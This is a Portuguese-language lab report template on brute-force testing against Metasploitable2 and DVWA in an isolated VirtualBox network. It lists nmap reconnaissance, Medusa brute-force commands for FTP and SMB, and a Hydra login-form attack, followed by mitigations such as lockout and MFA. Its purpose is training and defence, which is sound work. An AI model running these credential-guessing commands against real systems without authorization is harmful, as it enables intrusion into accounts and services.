# Relatório de Testes — Força Bruta com Medusa (Template)

Data: 2025-11-06
Autor: davilucas10

1) Objetivo
Descrever os testes realizados (FTP, SMB, Web/DVWA) em ambiente controlado para demonstrar vetores de força bruta e mitigação.

2) Ambiente
- Host: VirtualBox
- Kali Linux (atacante) — IP: 192.168.56.100
- Metasploitable2 / DVWA (alvo) — IP: 192.168.56.101
- Rede: Host-only

3) Ferramentas
- Medusa (força bruta serviços: ftp, smbnt)
- Hydra (formulários web)
- Nmap (reconhecimento)
- Burp Suite (análise de formulário)

4) Testes realizados (registro)
4.1 Reconhecimento
- Comando: nmap -sS -sV -O -Pn 192.168.56.101
- Serviços descobertos: ftp(21), ssh(22), smb(445), http(80)
- Observações: Esse comando realiza um scan completo no alvo, identificando portas abertas, versões dos serviços e o sistema operacional, usando um método stealth e ignorando bloqueios de ping

4.2 FTP — Força bruta (Medusa)
- Comando utilizado:
  medusa -h 192.168.56.101 -u wordlists-smb-users.txt -P wordlists/common-passwords.txt -M ftp -t 6
- Resultado: (copiar saída relevante)
- Evidência: imagens/ftp-success.png
- Impacto: acesso FTP não autorizado.

4.3 SMB — Password spraying (Medusa)
- Comando utilizado:
  medusa -h 192.168.56.101 -U wordlists/smb-users.txt -P wordlists/common-passwords.txt -M smbnt
- Resultado: (copiar saída)
- Evidência: images/smb-success.png

4.4 DVWA — Formulário web (Hydra/Burp)
- Técnica: brute force no formulário de login
- Comando (Hydra):
  hydra -l admin -P wordlists/common-passwords.txt 192.168.56.101 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
- Resultado: (copiar saída)
- Observação: DVWA pode bloquear após múltiplas tentativas dependendo do nível de segurança.

5) Recomendações e Mitigações
- Aplicar política de senhas fortes e expiração.
- Ativar bloqueio temporário após N falhas.
- Implementar MFA.
- Monitoramento de logs e alertas automatizados.
- Limitar serviços expostos e aplicar patches.

6) Lições aprendidas
- Descrever dificuldades, decisões sobre wordlists e limites éticos.
- Próximos passos: testar contramedidas, automatizar relatórios, aumentar wordlists com regras do Hashcat/Crunch.

Anexos
- /images/* — capturas de tela e logs
